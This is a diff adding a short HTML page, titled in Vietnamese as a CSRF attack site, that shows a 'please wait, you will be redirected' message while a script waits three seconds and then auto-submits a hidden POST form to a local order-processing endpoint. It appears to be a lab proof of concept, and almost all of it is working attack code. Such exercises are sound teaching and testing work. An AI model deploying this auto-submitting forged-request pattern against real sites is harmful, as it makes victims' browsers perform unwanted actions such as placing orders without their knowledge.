@@ -1,0 +1,26 @@
+<html>
+<head>
+    <title>Trang web attack CSRF</title>
+</head>
+<body>
+    <h1>Trang Web Attack CSRF</h1>
+    <p>Vui long cho, ban se duoc chuyen huong ...</p>
+    <script>
+        setTimeout(function() {
+            var form = document.createElement("form");
+            form.setAttribute("method", "POST");
+            form.setAttribute("action", "http://localhost:8080/process_order.php");
+
+            var productNameField = document.createElement("input");
+            productNameField.setAttribute("type", "hidden");
+            productNameField.setAttribute("name", "product_name");
+            productNameField.setAttribute("value", "Tấn Công CSRF");
+
+            form.appendChild(productNameField);
+
+            document.body.appendChild(form);
+            form.submit();
+        }, 3000);
+    </script>
+</body>
+</html>
